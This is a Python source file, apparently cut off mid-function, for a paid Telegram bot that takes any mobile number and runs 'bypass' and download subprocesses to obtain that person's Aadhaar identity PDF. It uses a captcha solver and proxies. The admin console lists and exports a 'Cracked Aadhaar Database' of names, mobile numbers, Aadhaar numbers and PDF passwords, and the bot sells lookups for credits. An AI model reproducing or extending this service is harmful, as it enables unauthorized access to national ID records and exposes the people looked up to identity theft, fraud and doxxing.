import os
import sys
import re
import importlib
import asyncio
import aiohttp

# --- REQUIREMENT CHECKER START ---
REQUIRED_MODULES = {
    "telebot": "pyTelegramBotAPI",
    "requests": "requests",
    "urllib3": "urllib3",
    "dotenv": "python-dotenv",
    "ddddocr": "ddddocr",
    "fitz": "pymupdf",
    "phonenumbers": "phonenumbers",
    "aiohttp": "aiohttp"
}

REQUIRED_FILES = {
    "stats_manager.py": "Core stats registry manager",
    "aadhaar_engine.py": "Core Aadhaar backend engine",
    "retrive-eid.py": "Phase 1 bypass subprocess",
    "aadhar-downlaod.py": "Phase 2 download subprocess",
    "pdf_processor.py": "PDF processing engine",
    "proxy_loader.py": "Shared proxy loader utility",
}

def check_startup_requirements():
    print("📋 ========================================================")
    print("        AADHAAR TELEGRAM BOT - STARTUP VERIFICATION        ")
    print("============================================================")

    base_dir = os.path.dirname(os.path.abspath(__file__))

    print("\n📦 Verifying Python Package Dependencies:")
    print("------------------------------------------------------------")
    missing_packages = []
    for module_name, pip_name in REQUIRED_MODULES.items():
        try:
            importlib.import_module(module_name)
            print(f"  🟢 {pip_name:<20} -> PRESENT")
        except ImportError:
            print(f"  🔴 {pip_name:<20} -> MISSING")
            missing_packages.append(pip_name)

    print("\n📂 Verifying Core Codebase Files:")
    print("------------------------------------------------------------")
    missing_files = []
    for file_name, desc in REQUIRED_FILES.items():
        full_path = os.path.join(base_dir, file_name)
        if os.path.exists(full_path):
            print(f"  🟢 {file_name:<22} -> PRESENT ({desc})")
        else:
            print(f"  🔴 {file_name:<22} -> MISSING ({desc})")
            missing_files.append(file_name)

    print("\n🔑 Verifying Environment Settings (.env):")
    print("------------------------------------------------------------")
    env_path = os.path.join(base_dir, ".env")
    env_exists = os.path.exists(env_path)
    token_found = False
    if env_exists:
        print("  🟢 .env Configuration File -> FOUND")
        with open(env_path, "r", encoding="utf-8") as f:
            env_content = f.read()
        admin_found = False
        for line in env_content.splitlines():
            line = line.strip()
            if line.startswith("TELEGRAM_BOT_TOKEN="):
                val = line.split("=", 1)[1].strip().replace("'", "").replace('"', '')
                if val:
                    token_found = True
            elif line.startswith("ADMIN_IDS="):
                val = line.split("=", 1)[1].strip().replace("'", "").replace('"', '')
                if val:
                    admin_found = True
        print("  🟢 TELEGRAM_BOT_TOKEN      -> CONFIGURED" if token_found else "  🔴 TELEGRAM_BOT_TOKEN      -> MISSING")
        print("  🟢 ADMIN_IDS               -> CONFIGURED" if admin_found else "  🟡 ADMIN_IDS               -> WARNING")
    else:
        print("  🔴 .env Configuration File -> MISSING")

    print("\n🌐 Verifying Proxy Configuration:")
    print("------------------------------------------------------------")
    proxy_path = os.path.join(base_dir, "proxies.txt")
    if os.path.exists(proxy_path):
        try:
            with open(proxy_path, 'r', encoding='utf-8', errors='ignore') as f:
                proxy_lines = [l.strip() for l in f if l.strip() and not l.strip().startswith('#')]
            print(f"  🟢 proxies.txt             -> FOUND ({len(proxy_lines)} proxies)")
        except Exception as e:
            print(f"  🟡 proxies.txt             -> FOUND (read error: {e})")
    else:
        print("  🟡 proxies.txt             -> NOT FOUND")

    print("============================================================\n")

    has_errors = (len(missing_packages) > 0 or len(missing_files) > 0 or not env_exists or not token_found)
    if has_errors:
        print("❌ STARTUP ERROR: Critical requirements are missing!")
        if len(missing_packages) > 0:
            print(f"👉 pip install {' '.join(missing_packages)}")
        if len(missing_files) > 0:
            for f in missing_files:
                print(f"   Missing: {f}")
        if not env_exists or not token_found:
            print("👉 Create .env with TELEGRAM_BOT_TOKEN and ADMIN_IDS")
        sys.exit(1)
    else:
        print("✨ All requirements met! Starting Aadhaar Telegram Bot...\n")

check_startup_requirements()
# --- REQUIREMENT CHECKER END ---

import telebot
import json
import threading
import time
from telebot import types, apihelper
from dotenv import load_dotenv

load_dotenv()
os.environ['PYTHONIOENCODING'] = 'utf-8'

import aadhaar_engine
from aadhaar_engine import user_page_registry

TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
if not TOKEN:
    print("❌ Error: TELEGRAM_BOT_TOKEN not defined.")
    sys.exit(1)

DEVELOPER_USERNAME = os.getenv('DEVELOPER_USERNAME', 'DARKVENDOR07')

ADMIN_IDS_RAW = os.getenv('ADMIN_IDS')
if not ADMIN_IDS_RAW:
    print("⚠️ Warning: ADMIN_IDS not configured.")
    ADMIN_IDS = []
else:
    ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_RAW.split(',') if x.strip().isdigit()]

REQUIRED_CHANNELS_RAW = os.getenv('REQUIRED_CHANNEL_IDS')
if not REQUIRED_CHANNELS_RAW:
    print("⚠️ Warning: REQUIRED_CHANNEL_IDS not configured.")
    REQUIRED_CHANNELS = []
else:
    REQUIRED_CHANNELS = []
    for x in REQUIRED_CHANNELS_RAW.split(','):
        x = x.strip()
        if x:
            if x.startswith('-') and x[1:].isdigit():
                REQUIRED_CHANNELS.append(int(x))
            elif x.isdigit():
                REQUIRED_CHANNELS.append(int(x))
            else:
                REQUIRED_CHANNELS.append(x)

import stats_manager

class BotExceptionHandler(telebot.ExceptionHandler):
    def handle(self, exception):
        print(f"⚠️ [TELEBOT EXCEPTION] Handled: {exception}")
        if "getaddrinfo failed" in str(exception) or "NewConnectionError" in str(exception) or "Max retries exceeded" in str(exception):
            time.sleep(5)
        return True

apihelper.SESSION_TIME_TO_LIVE = 5 * 60
bot = telebot.TeleBot(TOKEN, parse_mode='HTML', exception_handler=BotExceptionHandler())

orig_send_message = bot.send_message
orig_edit_message_text = bot.edit_message_text

def safe_send_message(*args, **kwargs):
    kwargs.pop('timeout', None)
    for attempt in range(3):
        try:
            return orig_send_message(*args, **kwargs)
        except Exception as e:
            err_str = str(e)
            if "blocked by the user" in err_str or "Forbidden" in err_str or "chat not found" in err_str or "403" in err_str:
                raise e
            print(f"⚠️ [SEND RETRY {attempt+1}/3]: {e}")
            if attempt == 2:
                raise e
            time.sleep(1)

def safe_edit_message_text(*args, **kwargs):
    kwargs.pop('timeout', None)
    for attempt in range(3):
        try:
            return orig_edit_message_text(*args, **kwargs)
        except Exception as e:
            err_str = str(e)
            if "message is not modified" in err_str:
                return True
            if "blocked by the user" in err_str or "Forbidden" in err_str or "chat not found" in err_str or "403" in err_str:
                raise e
            print(f"⚠️ [EDIT RETRY {attempt+1}/3]: {e}")
            if attempt == 2:
                raise e
            time.sleep(1)

bot.send_message = safe_send_message
bot.edit_message_text = safe_edit_message_text

orig_send_photo = bot.send_photo
orig_send_document = bot.send_document

def safe_send_photo(*args, **kwargs):
    kwargs.pop('timeout', None)
    for attempt in range(3):
        try:
            return orig_send_photo(*args, **kwargs)
        except Exception as e:
            print(f"⚠️ [PHOTO RETRY {attempt+1}/3]: {e}")
            if attempt == 2:
                raise e
            time.sleep(2)

def safe_send_document(*args, **kwargs):
    kwargs.pop('timeout', None)
    for attempt in range(3):
        try:
            return orig_send_document(*args, **kwargs)
        except Exception as e:
            print(f"⚠️ [DOC RETRY {attempt+1}/3]: {e}")
            if attempt == 2:
                raise e
            time.sleep(2)

bot.send_photo = safe_send_photo
bot.send_document = safe_send_document


BASE_DIR = os.path.dirname(os.path.abspath(__file__))
user_states = {}
loop = None


def check_user_joined(chat_id):
    if chat_id < 0:
        return True
    if chat_id in ADMIN_IDS:
        return True
    if not REQUIRED_CHANNELS:
        return True
    for channel in REQUIRED_CHANNELS:
        try:
            member = bot.get_chat_member(chat_id=channel, user_id=chat_id)
            if member.status in ['left', 'kicked']:
                return False
        except apihelper.ApiTelegramException as e:
            err_msg = str(e).lower()
            if "user not found" in err_msg or "user_not_participant" in err_msg:
                return False
            print(f"⚠️ [JOIN CHECK] Configuration issue for channel {channel}: {e}")
        except Exception as e:
            print(f"⚠️ [JOIN CHECK] Failed for channel {channel}: {e}")
    return True


def prompt_join_channels(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=1)
    join_text = "⚠️ <b>Join Required Channels</b>\n\nBot ko use karne ke liye aapko niche diye gaye channels ko join karna zaroori hai:\n"
    for idx, channel in enumerate(REQUIRED_CHANNELS, 1):
        url = None
        title = f"Channel {idx}"
        try:
            chat_info = bot.get_chat(channel)
            title = chat_info.title or f"Channel {idx}"
            if chat_info.username:
                url = f"https://t.me/{chat_info.username}"
            elif chat_info.invite_link:
                url = chat_info.invite_link
            else:
                try:
                    url = bot.export_chat_invite_link(channel)
                except Exception as ex:
                    print(f"⚠️ Export invite link failed for {channel}: {ex}")
                    url = f"https://t.me/c/{str(channel).replace('-100', '')}"
        except Exception as e:
            print(f"⚠️ Error getting chat info for {channel}: {e}")
            url = f"https://t.me/DARKVENDOR07"
        btn = types.InlineKeyboardButton(f"📢 Join {title}", url=url)
        markup.add(btn)
    btn_check = types.InlineKeyboardButton("🔄 Re-Verify / Start", callback_data="check_joined_status")
    markup.add(btn_check)
    bot.send_message(chat_id, join_text, reply_markup=markup, parse_mode='HTML')


def esc(s):
    return str(s or '').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')


def get_ui_card(step_num, title, description, target=None, show_tip=True):
    body = ""
    if step_num:
        body += f"📱 <b>STEP {step_num}/4: {title}</b>\n\n"
    else:
        body += f"⭐ <b>{title}</b>\n\n"
    body += f"{description}\n"
    if target:
        body += "\n━━━━━━━━━━━━━━━━━━━━━━\n"
        body += f"📱 <b>Target Mobile:</b> <code>{target}</code>\n"
    if show_tip:
        body += ("━━━━━━━━━━━━━━━━━━━━━━\n💡 <i>Tip: Send <b>/cancel</b> to abort.</i>")
    else:
        body += "━━━━━━━━━━━━━━━━━━━━━━"
    return body


def send_zero_credits_dashboard(chat_id, message_id=None):
    try:
        bot_username = bot.get_me().username
    except Exception as e:
        print(f"⚠️ Failed to get bot username: {e}")
        bot_username = "bot"
    referral_link = f"https://t.me/{bot_username}?start=ref_{chat_id}"
    data = stats_manager.load_stats()
    user_record = None
    for u in data.get("users", []):
        if isinstance(u, dict) and str(u.get("chat_id")) == str(chat_id):
            user_record = u
            break
    join_date = user_record.get("joined", "N/A") if user_record else "N/A"
    history = data.get("cracked_history", [])
    success_count = sum(1 for r in history if str(r.get("chat_id")) == str(chat_id))
    referred_count = 0
    for u in data.get("users", []):
        if isinstance(u, dict):
            ref_by = u.get("referred_by")
            if ref_by is not None and str(ref_by) == str(chat_id):
                referred_count += 1
    zero_credits_text = (
        "⚠️ <b>NO CREDITS REMAINING!</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Aapke paas Aadhaar Nikalne ke liye credits khatam ho gaye hain.\n\n"
        "👤 <b>YOUR PROFILE STATS:</b>\n"
        f"  ├─ <b>Telegram ID:</b> <code>{chat_id}</code>\n"
        f"  ├─ <b>Joined Date:</b> <code>{join_date}</code>\n"
        f"  ├─ <b>Credit Balance:</b> <code>0 💳</code>\n"
        f"  ├─ <b>Success Checked:</b> <code>{success_count} ✅</code>\n"
        f"  └─ <b>Total Referrals:</b> <code>{referred_count} joined</code>\n\n"
        "🤝 <b>REFER & EARN CREDITS:</b>\n"
        "Apne dosto ko bot par invite karein aur har successful join par <b>1 Credit</b> payein!\n\n"
        f"🔗 <b>Your Invite Link:</b>\n<code>{referral_link}</code>\n\n"
        "💬 Admin/Developer se credits lene ke liye niche direct click karein."
    )
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_buy = types.InlineKeyboardButton("👨‍💻 Contact Admin", url=f"https://t.me/{DEVELOPER_USERNAME}")
    btn_refresh = types.InlineKeyboardButton("🔄 Refresh Credits", callback_data="refresh_zero_credits")
    markup.add(btn_buy, btn_refresh)
    if message_id:
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=zero_credits_text, reply_markup=markup, parse_mode='HTML')
        except Exception as e:
            print(f"⚠️ [ZERO_CREDITS] Failed to edit: {e}")
            bot.send_message(chat_id, zero_credits_text, reply_markup=markup, parse_mode='HTML')
    else:
        bot.send_message(chat_id, zero_credits_text, reply_markup=markup, parse_mode='HTML')


def send_welcome_dashboard(chat_id, message_id=None):
    mode = stats_manager.get_bot_mode()
    if mode == "paid":
        credits = stats_manager.get_user_credits(chat_id)
        credits_info = f"\n💳 <b>Credits Left:</b> <code>{credits}</code>\n"
    else:
        credits_info = f"\n💳 <b>Credits Left:</b> <code>Unlimited</code>\n"
    welcome_text = (
        "👋 <b>Welcome to the Aadhaar BOT!</b>\n"
        "Extract Aadhaar details and generate decrypted PDFs instantly.\n"
        f"{credits_info}\n"
        "⚡ <b>Select an option below to begin:</b>"
    )
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_dev = types.InlineKeyboardButton("👨‍💻 Developer", url=f"https://t.me/{DEVELOPER_USERNAME}")
    btn_start = types.InlineKeyboardButton("🚀 Start", callback_data="start_bypass")
    markup.add(btn_dev, btn_start)
    if message_id:
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=welcome_text, reply_markup=markup, parse_mode='HTML')
        except Exception as e:
            print(f"⚠️ [WELCOME] Failed to edit: {e}")
            bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode='HTML')
    else:
        bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode='HTML')


@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    parts = message.text.split()
    referrer_id = None
    if len(parts) > 1 and parts[1].startswith("ref_"):
        try:
            referrer_id = int(parts[1].split("_")[1])
        except:
            pass
    is_new_user = not stats_manager.is_user_registered(chat_id)
    try:
        stats_manager.register_visit(chat_id, username=message.from_user.username, first_name=message.from_user.first_name)
    except Exception as e:
        print(f"⚠️ [STATS] Failed to register visit: {e}")
    if is_new_user and referrer_id and referrer_id != chat_id:
        try:
            stats_manager.add_user_credits(referrer_id, 1)
            data = stats_manager.load_stats()
            for u in data.get("users", []):
                if isinstance(u, dict) and u.get("chat_id") == chat_id:
                    u["referred_by"] = referrer_id
                    break
            stats_manager.save_stats(data)
            new_user_name = message.from_user.first_name or "Someone"
            ref_notify = f"User named {new_user_name} joined through your link and you got 1 credit"
            bot.send_message(referrer_id, ref_notify)
        except Exception as ref_err:
            print(f"⚠️ [REFERRAL] Error: {ref_err}")
    if not check_user_joined(chat_id):
        prompt_join_channels(chat_id)
        return
    str_chat_id = str(chat_id)
    if str_chat_id in aadhaar_engine.active_tasks or user_states.get(chat_id, {}).get('step') in ['PROCESSING', 'FETCHING_INFO']:
        warn_msg = (
            "⚠️ <b>Active Session Running</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "⏳ Aapka ek active task pehle se chal raha hai.\n"
            "Kripya wait karein ya <code>/cancel</code> send karein."
        )
        bot.send_message(chat_id, warn_msg, parse_mode='HTML')
        return
    user_states[chat_id] = {'step': 'IDLE'}
    send_welcome_dashboard(chat_id)


@bot.callback_query_handler(func=lambda call: call.data == 'start_bypass')
def handle_start_bypass(call):
    chat_id = call.message.chat.id
    print(f"📥 [CALLBACK] start_bypass for {chat_id}")
    try:
        bot.answer_callback_query(call.id)
    except: pass
    if not check_user_joined(chat_id):
        try:
            bot.delete_message(chat_id=chat_id, message_id=call.message.message_id)
        except: pass
        prompt_join_channels(chat_id)
        return
    if stats_manager.get_bot_mode() == "paid":
        credits = stats_manager.get_user_credits(chat_id)
        if credits <= 0:
            send_zero_credits_dashboard(chat_id, message_id=call.message.message_id)
            return
    user_states[chat_id] = {'step': 'AWAITING_MOBILE'}
    step1_text = get_ui_card(
        step_num="1",
        title="Mobile Verification",
        description="Please send the <b>10-digit Mobile Number</b> linked to Aadhaar."
    )
    try:
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=step1_text, parse_mode='HTML')
    except:
        bot.send_message(chat_id, step1_text, parse_mode='HTML')


def get_admin_dashboard_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    mode = stats_manager.get_bot_mode()
    mode_btn_text = "🔓 Toggle Mode: FREE" if mode == "free" else "🔒 Toggle Mode: PAID"
    btn_toggle_mode = types.InlineKeyboardButton(mode_btn_text, callback_data="admin_toggle_mode")
    btn_set_def_credits = types.InlineKeyboardButton("💳 Default Credits", callback_data="admin_set_default_credits")
    btn_sys_settings = types.InlineKeyboardButton("⚙️ System Settings", callback_data="admin_settings_menu")
    btn_view_recent_cracks = types.InlineKeyboardButton("👁 View Recent Cracks", callback_data="admin_view_recent_cracks")
    btn_grant_credits = types.InlineKeyboardButton("➕ Grant Credits", callback_data="admin_grant_credits")
    btn_broadcast = types.InlineKeyboardButton("📢 Broadcast Msg", callback_data="admin_broadcast")
    btn_view_users = types.InlineKeyboardButton("👥 View Users", callback_data="admin_view_users_page_1")
    btn_export_users = types.InlineKeyboardButton("📥 Export User List", callback_data="admin_download_users")
    btn_view_logs = types.InlineKeyboardButton("👁 View Error Logs", callback_data="admin_view_logs")
    btn_export_logs = types.InlineKeyboardButton("📥 Export Error Logs", callback_data="admin_download_logs")
    btn_cracked = types.InlineKeyboardButton("📂 Download Cracked Database", callback_data="admin_download_cracked")
    btn_stats = types.InlineKeyboardButton("🔄 Refresh Console", callback_data="admin_stats")
    markup.add(btn_toggle_mode, btn_set_def_credits)
    markup.add(btn_sys_settings, btn_view_recent_cracks)
    markup.add(btn_grant_credits, btn_broadcast)
    markup.add(btn_view_users, btn_export_users)
    markup.add(btn_view_logs, btn_export_logs)
    markup.add(btn_cracked)
    markup.add(btn_stats)
    return markup


def send_admin_dashboard(chat_id):
    summary = stats_manager.get_stats_summary(user_states)
    markup = get_admin_dashboard_markup()
    bot.send_message(chat_id, summary, reply_markup=markup, parse_mode='HTML')


@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def handle_admin_callbacks(call):
    chat_id = call.message.chat.id
    if chat_id not in ADMIN_IDS:
        try: bot.answer_callback_query(call.id, "Access Denied!")
        except: pass
        return
    try: bot.answer_callback_query(call.id)
    except: pass
    action = call.data
    if action == "admin_stats":
        summary = stats_manager.get_stats_summary(user_states)
        markup = get_admin_dashboard_markup()
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=summary, reply_markup=markup, parse_mode='HTML')
        except: pass
    elif action == "admin_settings_menu":
        cooldown = stats_manager.get_cooldown_seconds()
        max_concurrent = stats_manager.get_max_concurrent_tasks()
        settings_text = (
            "⚙️ <b>SYSTEM CONFIGURATION SETTINGS</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Cooldown Timer:  <b>{cooldown}s</b>\n"
            f"⚡ Max Concurrency:  <b>{max_concurrent} tasks</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Choose a setting to adjust below:"
        )
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn_cooldown = types.InlineKeyboardButton(f"⏳ Cooldown ({cooldown}s)", callback_data="admin_set_cooldown")
        btn_concurrency = types.InlineKeyboardButton(f"⚡ Max Concurrent ({max_concurrent})", callback_data="admin_set_concurrent")
        btn_back = types.InlineKeyboardButton("🔙 Back to Main", callback_data="admin_stats")
        markup.add(btn_cooldown, btn_concurrency)
        markup.add(btn_back)
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=settings_text, reply_markup=markup, parse_mode='HTML')
        except: pass
    elif action == "admin_set_cooldown":
        user_states[chat_id] = {'step': 'AWAITING_ADMIN_COOLDOWN'}
        cancel_markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        cancel_markup.add("Cancel")
        bot.send_message(chat_id, "⏳ <b>Set Global Cooldown</b>\n\n👇 Enter cooldown period in seconds:\n\nType <b>Cancel</b> to abort.", reply_markup=cancel_markup, parse_mode='HTML')
    elif action == "admin_set_concurrent":
        user_states[chat_id] = {'step': 'AWAITING_ADMIN_MAX_CONCURRENT'}
        cancel_markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        cancel_markup.add("Cancel")
        bot.send_message(chat_id, "⚡ <b>Set Max Concurrency Limit</b>\n\n👇 Enter max concurrent tasks:\n\nType <b>Cancel</b> to abort.", reply_markup=cancel_markup, parse_mode='HTML')
    elif action == "admin_view_recent_cracks":
        data = stats_manager.load_stats()
        history = data.get("cracked_history", [])
        recent = history[-5:]
        msg_text = "👁 <b>RECENT CRACKED DETAILS (Last 5)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        if not recent:
            msg_text += "<i>No successful crack history found.</i>\n"
        else:
            for idx, record in enumerate(reversed(recent), 1):
                timestamp = record.get("timestamp", "N/A")
                fname = record.get("first_name", "N/A")
                uname = record.get("username", "N/A")
                hname = record.get("name", "N/A")
                mobile_num = record.get("mobile", "N/A")
                uid_num = record.get("uid", "N/A")
                pwd = record.get("password", "N/A")
                eid_num = record.get("eid", "N/A")
                uname_str = f" (@{uname})" if uname and uname != "N/A" else ""
                msg_text += (
                    f"🎯 <b>{idx}. {hname}</b>\n"
                    f"  ├─ 📅 Time: <code>{timestamp}</code>\n"
                    f"  ├─ 👤 User: {fname}{uname_str}\n"
                    f"  ├─ 📞 Mobile: <code>{mobile_num}</code>\n"
                    f"  ├─ 🆔 EID: <code>{eid_num}</code>\n"
                    f"  ├─ 🔑 Aadhaar: <code>{uid_num}</code>\n"
                    f"  └─ 🔓 Password: <code>{pwd}</code>\n"
                    f"──────────────────────\n"
                )
        msg_text += "━━━━━━━━━━━━━━━━━━━━━━"
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn_refresh = types.InlineKeyboardButton("🔄 Refresh Feed", callback_data="admin_view_recent_cracks")
        btn_back = types.InlineKeyboardButton("🔙 Back to Dashboard", callback_data="admin_stats")
        markup.add(btn_refresh, btn_back)
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=msg_text, reply_markup=markup, parse_mode='HTML')
        except: pass
    elif action == "admin_toggle_mode":
        current_mode = stats_manager.get_bot_mode()
        new_mode = "paid" if current_mode == "free" else "free"
        stats_manager.set_bot_mode(new_mode)
        summary = stats_manager.get_stats_summary(user_states)
        markup = get_admin_dashboard_markup()
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=summary, reply_markup=markup, parse_mode='HTML')
        except: pass
    elif action == "admin_set_default_credits":
        user_states[chat_id] = {'step': 'AWAITING_ADMIN_DEFAULT_CREDITS'}
        cancel_markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        cancel_markup.add("Cancel")
        bot.send_message(chat_id, "💳 <b>Set Default Credits</b>\n\n👇 Enter default credits for new users:\n\nType <b>Cancel</b> to abort.", reply_markup=cancel_markup, parse_mode='HTML')
    elif action == "admin_grant_credits":
        user_states[chat_id] = {'step': 'AWAITING_ADMIN_GRANT_USER_ID'}
        cancel_markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        cancel_markup.add("Cancel")
        bot.send_message(chat_id, "➕ <b>Grant User Credits</b>\n\n👇 Enter Telegram User ID:\n\nType <b>Cancel</b> to abort.", reply_markup=cancel_markup, parse_mode='HTML')
    elif action == "admin_broadcast":
        user_states[chat_id] = {'step': 'AWAITING_BROADCAST_MSG'}
        cancel_markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        cancel_markup.add("Cancel")
        bot.send_message(chat_id, "📢 <b>Broadcast Command Triggered</b>\n\n👇 Send text, image, document ya forward message.\n\nType <b>Cancel</b> to abort.", reply_markup=cancel_markup, parse_mode='HTML')
    elif action == "admin_download_cracked":
        bot.send_message(chat_id, "⏳ <b>Fetching Cracked Data...</b>", parse_mode='HTML')
        import shutil
        permanent_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cracked_history.txt")
        temp_report_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cracked_history_temp.txt")
        if os.path.exists(permanent_path) and os.path.getsize(permanent_path) > 0:
            try:
                shutil.copy(permanent_path, temp_report_path)
                report_path = temp_report_path
            except Exception as e:
                print(f"⚠️ Failed to copy: {e}")
                report_path = stats_manager.get_cracked_data_file_path()
        else:
            report_path = stats_manager.get_cracked_data_file_path()
        if report_path and os.path.exists(report_path):
            with open(report_path, 'rb') as f:
                bot.send_document(chat_id, f, caption="📂 <b>Cracked Aadhaar Database Log</b>")
            try: os.remove(report_path)
            except: pass
        else:
            bot.send_message(chat_id, "❌ Failed to generate report.", parse_mode='HTML')
    elif action == "admin_download_users":
        bot.send_message(chat_id, "⏳ <b>Generating User List...</b>", parse_mode='HTML')
        data = stats_manager.load_stats()
        users = data.get("users", [])
        def_credits = stats_manager.get_default_credits()
        if not users:
            bot.send_message(chat_id, "❌ No registered users.", parse_mode='HTML')
        else:
            users_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "users_list.txt")
            with open(users_file, 'w', encoding='utf-8') as f:
                f.write(f"🔒 REGISTERED BOT USERS REPORT ({len(users)} total)\n")
                f.write("=" * 60 + "\n\n")
                for idx, u in enumerate(users, 1):
                    if isinstance(u, dict):
                        cid = u.get("chat_id", "N/A")
                        fname = u.get("first_name", "N/A")
                        uname = u.get("username", "N/A")
                        joined = u.get("joined", "N/A")
                        credits = u.get("credits", def_credits)
                        uname_str = f" (@{uname})" if uname and uname != "N/A" else ""
                        f.write(f"{idx}. 👤 {fname}{uname_str}\n   🆔 ID: {cid} | 💳 Credits: {credits} | 📅 Joined: {joined}\n\n")
                    else:
                        f.write(f"{idx}. 🆔 User ID: {u}\n\n")
            with open(users_file, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"👤 <b>Registered Bot Users ({len(users)})</b>")
            try: os.remove(users_file)
            except: pass
    elif action == "admin_download_logs":
        bot.send_message(chat_id, "⏳ <b>Fetching Error Logs...</b>", parse_mode='HTML')
        log_path = stats_manager.get_error_log_file_path()
        if log_path and os.path.exists(log_path):
            with open(log_path, 'rb') as f:
                bot.send_document(chat_id, f, caption="⚠️ <b>Aadhaar Bot User Error Logs</b>")
        else:
            bot.send_message(chat_id, "✅ No user errors logged.", parse_mode='HTML')
    elif action.startswith("admin_view_users_page_"):
        try:
            page = int(action.split("_")[-1])
        except:
            page = 1
        data = stats_manager.load_stats()
        users = data.get("users", [])
        if not users:
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="❌ No users.", reply_markup=get_admin_dashboard_markup(), parse_mode='HTML')
            except: pass
            return
        PAGE_SIZE = 5
        total_users = len(users)
        total_pages = max(1, (total_users + PAGE_SIZE - 1) // PAGE_SIZE)
        page = max(1, min(page, total_pages))
        start_idx = (page - 1) * PAGE_SIZE
        page_users = users[start_idx:start_idx + PAGE_SIZE]
        msg_text = f"👥 <b>USER DECK (Page {page}/{total_pages})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        def_credits = stats_manager.get_default_credits()
        for idx, u in enumerate(page_users, start=start_idx + 1):
            if isinstance(u, dict):
                cid = u.get("chat_id", "N/A")
                fname = u.get("first_name", "N/A")
                uname = u.get("username", "N/A")
                joined = u.get("joined", "N/A")
                credits = u.get("credits", def_credits)
                uname_str = f" (@{uname})" if uname and uname != "N/A" else ""
                credit_status = f"<code>{credits} 💳</code>" if credits > 0 else "<code>0 💳</code>"
                msg_text += (
                    f"👤 <b>{idx}. {fname}</b>{uname_str}\n"
                    f"  ├─ 🆔 ID: <code>{cid}</code>\n"
                    f"  ├─ 💳 Balance: {credit_status}\n"
                    f"  └─ 📅 Joined: <code>{joined}</code>\n\n"
                )
            else:
                msg_text += f"🆔 User ID: <code>{u}</code>\n───\n\n"
        msg_text += f"━━━━━━━━━━━━━━━━━━━━━━\nTotal: <b>{total_users}</b>"
        markup = types.InlineKeyboardMarkup(row_width=2)
        nav_buttons = []
        if page > 1:
            nav_buttons.append(types.InlineKeyboardButton("⬅️ Previous", callback_data=f"admin_view_users_page_{page-1}"))
        if page < total_pages:
            nav_buttons.append(types.InlineKeyboardButton("➡️ Next", callback_data=f"admin_view_users_page_{page+1}"))
        if nav_buttons:
            markup.add(*nav_buttons)
        btn_export = types.InlineKeyboardButton("📥 Export Users", callback_data="admin_download_users")
        btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="admin_stats")
        markup.add(btn_export, btn_back)
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=msg_text, reply_markup=markup, parse_mode='HTML')
        except Exception as e:
            print(f"⚠️ [ADMIN] Error: {e}")
    elif action == "admin_view_logs":
        log_path = stats_manager.get_error_log_file_path()
        if not log_path or not os.path.exists(log_path):
            msg_text = "✅ <b>No user errors logged.</b>"
        else:
            try:
                with open(log_path, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                last_lines = [line.strip() for line in lines if line.strip()][-10:]
                msg_text = f"⚠️ <b>SYSTEM LOGS (Last {len(last_lines)})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                for line in last_lines:
                    try:
                        timestamp_part, rest = line.split("] User: ", 1)
                        timestamp = timestamp_part.replace("[", "")
                        user_info_part, error_part = rest.split(" | Error: ", 1)
                        msg_text += (
                            f"📅 <code>{timestamp}</code>\n"
                            f"👤 <b>User:</b> <code>{user_info_part}</code>\n"
                            f"❌ <b>Error:</b> <code>{error_part}</code>\n"
                            f"──────────────────────\n"
                        )
                    except:
                        msg_text += f"▪️ <code>{line}</code>\n"
                msg_text += "━━━━━━━━━━━━━━━━━━━━━━"
            except Exception as e:
                msg_text = f"❌ <b>Error reading log:</b> <code>{e}</code>"
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn_refresh = types.InlineKeyboardButton("🔄 Refresh", callback_data="admin_view_logs")
        btn_export = types.InlineKeyboardButton("📥 Export", callback_data="admin_download_logs")
        btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="admin_stats")
        markup.add(btn_refresh, btn_export)
        markup.add(btn_back)
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=msg_text, reply_markup=markup, parse_mode='HTML')
        except Exception as e:
